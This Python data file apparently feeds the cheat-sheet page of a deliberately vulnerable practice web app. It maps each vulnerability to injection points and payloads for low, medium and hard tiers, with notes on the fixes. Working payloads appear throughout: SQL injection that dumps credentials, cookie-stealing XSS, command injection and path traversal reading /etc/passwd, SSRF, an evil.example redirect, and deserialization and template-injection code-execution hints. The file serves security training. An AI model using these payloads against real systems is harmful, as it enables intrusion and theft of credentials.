"""
cheatsheet.py — structured attack data backing the in-app /lab page.

This is VULNERABILITIES.md turned into data instead of prose, so the
lab page can show "location + payload for the difficulty you're
currently on" inline, instead of sending you to a separate file.

Each entry is keyed by vuln_key -> {
    "low":    {"location": "...", "payload": "...", "note": "..."},
    "medium": {...},
    "hard":   {...},  # "note" explains why it's no longer exploitable
}

"location" is written the way you'd point a Burp/ZAP/Glacier repeater
at it: method + path (+ header/cookie name when the injection point
isn't a URL param or form field).
"""

CHEATSHEET = {
    "login_sqli": {
        "low":    {"location": "POST /login (form field: username)", "payload": "username=admin' --&password=x", "note": "Any password works once the query is short-circuited."},
        "medium": {"location": "POST /login (form field: username)", "payload": "username=admin' OR '1'='1' --&password=x", "note": "Quotes are doubled server-side; use an operator payload instead of a raw quote-breakout."},
        "hard":   {"location": "POST /login", "payload": "—", "note": "Parameterized query. Not exploitable via this field."},
    },
    "search_sqli": {
        "low":    {"location": "GET /search (param: q)", "payload": "q=xxxx' UNION SELECT id,username,1,password,role,'' FROM users --", "note": "Column types must line up with products (id, name, price, category, blurb, image_url)."},
        "medium": {"location": "GET /search (param: q)", "payload": "q=xxxx' UNION SELECT id,username,1,password,role,'' FROM users-- -", "note": "Single quotes are escaped; use comment tricks or a payload that avoids a literal quote."},
        "hard":   {"location": "GET /search", "payload": "—", "note": "Parameterized. See the 'Safe version' link."},
    },
    "product_sqli": {
        "low":    {"location": "GET /product (param: id)", "payload": "id=abc", "note": "Error-based — the raw SQL error (and query text) is shown when verbose_errors isn't at hard."},
        "medium": {"location": "GET /product (param: id)", "payload": "id='", "note": "Numeric ids are parameterized, but non-numeric input falls back to string concatenation — go in through that path."},
        "hard":   {"location": "GET /product", "payload": "—", "note": "Always parameterized."},
    },
    "blind_sqli_bool": {
        "low":    {"location": "GET /blind-product (param: id)", "payload": "id=1 OR 1=1  (compare against  id=1 AND 1=2)", "note": "No error text — page state (exists vs not) is the oracle. Once confirmed, swap in substr(password,1,1)='x' comparisons to extract data."},
        "medium": {"location": "GET /blind-product (param: id)", "payload": "id=1 AND (SELECT substr(password,1,1) FROM users WHERE username='admin')='0'-- -", "note": "Quotes are doubled; use numeric/boolean operators that don't need a literal quote."},
        "hard":   {"location": "GET /blind-product", "payload": "—", "note": "Parameterized."},
    },
    "blind_sqli_time": {
        "low":    {"location": "GET /slow-product (param: id)", "payload": "id=1 OR sleep(5)=0", "note": "~5s response confirms injection — timing oracle instead of a visible true/false."},
        "medium": {"location": "GET /slow-product (param: id)", "payload": "id=1 OR sleep(3)=0-- -", "note": "Same shape as blind_sqli_bool at medium."},
        "hard":   {"location": "GET /slow-product", "payload": "—", "note": "Parameterized."},
    },
    "recommend_sqli": {
        "low":    {"location": "GET /recommend (cookie: last_category)", "payload": "last_category=Tools' UNION SELECT id,username,password,role,'','' FROM users --", "note": "Set via Repeater's cookie jar / curl -b, not a URL param. Non-numeric price is caught and shown as text, so exact column typing isn't critical here."},
        "medium": {"location": "GET /recommend (cookie: last_category)", "payload": "last_category=Tools'' UNION SELECT id, username||':'||password, 0, 'x', bio, '' FROM users --", "note": "Cookie is backslash-escaped; a doubled-quote or comment payload still lands."},
        "hard":   {"location": "GET /recommend", "payload": "—", "note": "Parameterized — cookie value is not injectable."},
    },
    "header_sqli": {
        "low":    {"location": "GET /category (header: User-Agent or X-Forwarded-For)", "payload": "User-Agent: x', (SELECT password FROM users WHERE username='admin'), 'y')-- -", "note": "Check the result on Admin → Activity logs, not in the response body."},
        "medium": {"location": "GET /category (header: User-Agent)", "payload": "User-Agent: x', (SELECT password FROM users WHERE username='admin'), 'y')-- -", "note": "X-Forwarded-For is now IP-validated; User-Agent is still concatenated raw."},
        "hard":   {"location": "GET /category", "payload": "—", "note": "Both headers parameterized."},
    },
    "reflected_xss": {
        "low":    {"location": "GET /search (param: q)", "payload": "q=<script>alert(1)</script>", "note": "Reflected straight into the page."},
        "medium": {"location": "GET /search (param: q)", "payload": "q=<img src=x onerror=alert(1)>", "note": "The literal string '<script>' is stripped — use a different tag/handler or mixed case."},
        "hard":   {"location": "GET /search", "payload": "—", "note": "HTML-escaped on output."},
    },
    "stored_xss": {
        "low":    {"location": "POST /reviews (form field: body), rendered on GET /product?id=", "payload": "body=<script>alert(document.cookie)</script>", "note": "Persists — fires for every visitor who views that product page."},
        "medium": {"location": "POST /reviews (form field: body)", "payload": "body=<img src=x onerror=alert(document.cookie)>", "note": "Same '<script>' strip as reflected_xss — same bypasses apply."},
        "hard":   {"location": "POST /reviews", "payload": "—", "note": "Escaped at render time."},
    },
    "csrf": {
        "low":    {"location": "POST /checkout", "payload": "auto-submitting cross-site <form> — no token required at all", "note": "No CSRF token present."},
        "medium": {"location": "POST /checkout", "payload": "submit the form with any csrf_token value, including a blank one", "note": "A token is rendered but never checked server-side."},
        "hard":   {"location": "POST /checkout", "payload": "—", "note": "Token generated and verified."},
    },
    "idor_orders": {
        "low":    {"location": "GET /orders (param: id) or GET /account (param: id)", "payload": "id=<any order or account id>", "note": "No ownership check at all — walk the id space."},
        "medium": {"location": "GET /orders (param: id)", "payload": "id=<sequential ids, but slow down or rotate sessions>", "note": "Still no real ownership check — a per-session limiter blocks after ~5 distinct ids in ~20s."},
        "hard":   {"location": "GET /orders", "payload": "—", "note": "Ownership checked against the session."},
    },
    "broken_admin": {
        "low":    {"location": "GET /admin (cookie: is_admin)", "payload": "document.cookie = \"is_admin=true\"  (or visit /admin/become-admin-demo)", "note": "Works logged out entirely."},
        "medium": {"location": "GET /admin", "payload": "register/log in as any regular user, then visit /admin", "note": "Checks that a role session key exists, not its value."},
        "hard":   {"location": "GET /admin", "payload": "—", "note": "Real server-side role check."},
    },
    "mass_assignment": {
        "low":    {"location": "POST /account", "payload": "role=admin added to the profile-update form", "note": "Accepted and applied directly."},
        "medium": {"location": "POST /account", "payload": "role=Admin  (different casing than the blocked literal)", "note": "Only the exact string 'admin' is blocked."},
        "hard":   {"location": "POST /account", "payload": "—", "note": "role is never read from client input."},
    },
    "price_tamper": {
        "low":    {"location": "POST /cart", "payload": "price=0.01 on any product", "note": "Client-submitted price trusted outright."},
        "medium": {"location": "POST /cart", "payload": "price=0.01", "note": "Only price <= 0 is blocked — a small positive number still works."},
        "hard":   {"location": "POST /cart", "payload": "—", "note": "Price always sourced server-side from the catalog."},
    },
    "path_traversal": {
        "low":    {"location": "GET /read-file (param: file)", "payload": "file=../../../../etc/passwd", "note": "No path confinement at all."},
        "medium": {"location": "GET /read-file (param: file)", "payload": "file=..%2f..%2f..%2f..%2fetc/passwd", "note": "A single '../' strip is bypassed by URL-encoding or by doubling ('....//')."},
        "hard":   {"location": "GET /read-file", "payload": "—", "note": "Resolved and confined to the docs directory — see /safe-read-file."},
    },
    "file_upload": {
        "low":    {"location": "POST /account/avatar", "payload": "filename: ../../evil.php  (or any extension)", "note": "Any filename/extension accepted."},
        "medium": {"location": "POST /account/avatar", "payload": "filename: evil.php", "note": "Path separators are stripped, but any extension still passes."},
        "hard":   {"location": "POST /account/avatar", "payload": "—", "note": "Extension allow-list + server-generated filename."},
    },
    "command_injection": {
        "low":    {"location": "GET /ping (param: host)", "payload": "host=127.0.0.1; cat /etc/passwd", "note": "Also works with &&, backticks, $()."},
        "medium": {"location": "GET /ping (param: host)", "payload": "host=127.0.0.1 && cat /etc/passwd", "note": "Only ';' is stripped — use &&, |, backticks, $(), or a newline."},
        "hard":   {"location": "GET /ping", "payload": "—", "note": "shell=False with an argument list — see /safe-ping."},
    },
    "open_redirect": {
        "low":    {"location": "GET /go (param: url)", "payload": "url=https://evil.example/", "note": "Absolute URL accepted outright."},
        "medium": {"location": "GET /go (param: url)", "payload": "url=//evil.example/", "note": "Only blocks values starting with http(s):// — protocol-relative URL still redirects off-site."},
        "hard":   {"location": "GET /go", "payload": "—", "note": "Only same-site relative paths allowed — see /safe-go."},
    },
    "ssrf": {
        "low":    {"location": "POST /admin/import-image (form field: url)", "payload": "url=http://127.0.0.1:5099/version", "note": "Fetches and reflects back any URL, internal targets included."},
        "medium": {"location": "POST /admin/import-image (form field: url)", "payload": "url=http://2130706433/", "note": "Naive blacklist only blocks literal 'localhost'/127.0.0.1/etc — use decimal IP form, a trailing dot, or DNS rebinding."},
        "hard":   {"location": "POST /admin/import-image", "payload": "—", "note": "Resolves DNS, checks the real destination IP, restricts scheme, re-checks every redirect hop."},
    },
    "xxe": {
        "low":    {"location": "POST /admin/import-orders (XML file upload)", "payload": "<!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>", "note": "External entity resolution enabled."},
        "medium": {"location": "POST /admin/import-orders", "payload": "—", "note": "External entity resolution already disabled at medium and hard."},
        "hard":   {"location": "POST /admin/import-orders", "payload": "—", "note": "External entity resolution disabled."},
    },
    "ssti": {
        "low":    {"location": "POST /admin/email-preview (template field)", "payload": "{{ 7*7 }}", "note": "Renders 49 — confirms injection; escalate toward {{ config }} or a Jinja2 RCE gadget chain."},
        "medium": {"location": "POST /admin/email-preview", "payload": "{{ 7*7 }}", "note": "Same rendering path as low — check the settings page for the current tier."},
        "hard":   {"location": "POST /admin/email-preview", "payload": "—", "note": "Input treated as data, never as a template."},
    },
    "insecure_deserialization": {
        "low":    {"location": "cookie: remember_token, set after POST /login with remember=1", "payload": "base64(pickle.dumps(...))  crafted with a __reduce__ gadget calling os.system", "note": "Unpickled with no restriction on the next visit to /login."},
        "medium": {"location": "cookie: remember_token", "payload": "gadget built around builtins.eval / builtins.exec", "note": "A restricted unpickler blacklists os/subprocess/shutil/socket/pickle by module — but not builtins."},
        "hard":   {"location": "cookie: remember_token", "payload": "—", "note": "No pickle involved — 'remember me' just extends the signed Flask session."},
    },
    "weak_crypto": {
        "low":    {"location": "POST /register", "payload": "crack the stored hash with hashcat -m 0 (unsalted MD5)", "note": "Two users with the same password get identical hashes."},
        "medium": {"location": "POST /register", "payload": "same as low", "note": "Not yet difficulty-gated — behaves the same at every tier."},
        "hard":   {"location": "POST /register", "payload": "same as low", "note": "Not yet difficulty-gated — behaves the same at every tier."},
    },
    "verbose_errors": {
        "low":    {"location": "GET /product (param: id) or GET /version", "payload": "id=abc", "note": "Raw SQL error plus the query text itself is shown."},
        "medium": {"location": "GET /product (param: id)", "payload": "id=abc", "note": "Error message shown, but not the raw query."},
        "hard":   {"location": "GET /product", "payload": "—", "note": "Generic error only."},
    },
}
